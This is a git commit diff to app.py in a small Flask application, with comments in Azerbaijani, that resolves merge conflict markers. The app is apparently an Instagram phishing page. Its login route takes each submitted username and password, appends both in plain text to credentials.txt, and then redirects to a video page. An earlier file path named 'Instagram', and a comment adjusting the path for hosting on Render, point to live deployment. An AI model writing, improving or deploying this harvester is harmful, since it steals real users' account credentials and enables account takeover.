71ce7dae23a47904d18be71e7114930c92959077
Uchiha1203 <alirahimov20063003@gmail.com>
2025-05-31 07:34:39 +0400

    Fix merge conflicts and update app.py

--- app.py
+++ app.py
@@ -1,4 +1,3 @@
-<<<<<<< HEAD
 from flask import Flask, request, redirect, render_template, url_for
 
 app = Flask(__name__)
@@ -13,7 +12,7 @@ def login():
     password = request.form['password']
     
     # Məlumatları credentials.txt faylında saxla
-    with open('D:/Instagram/credentials.txt', 'a') as f:
+    with open('credentials.txt', 'a') as f:  # Düz yol budur, absolyut yolu yazmaq Renderdə problemlər yarada bilər
         f.write(f'Username: {username}, Password: {password}\n')
     
     # Login olandan sonra video səhifəsinə yönləndir
@@ -25,31 +24,3 @@ def video():
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5001, debug=True)
-=======
-from flask import Flask, request, redirect, render_template, url_for
-
-app = Flask(__name__)
-
-@app.route('/')
-def index():
-    return render_template('index.html')  # HTML faylınızı burada çağırın
-
-@app.route('/login', methods=['POST'])
-def login():
-    username = request.form['username']
-    password = request.form['password']
-    
-    # Məlumatları credentials.txt faylında saxla
-    with open('credentials.txt', 'a') as f:
-        f.write(f'Username: {username}, Password: {password}\n')
-    
-    # Login olandan sonra video səhifəsinə yönləndir
-    return redirect(url_for('video'))
-
-@app.route('/video')
-def video():
-    return render_template('video.html')
-
-app.run()
-    app.run(host='0.0.0.0', port=5001, debug=True)
->>>>>>> fcbe42d3478b70c34d9d70bab789f022cdee3908
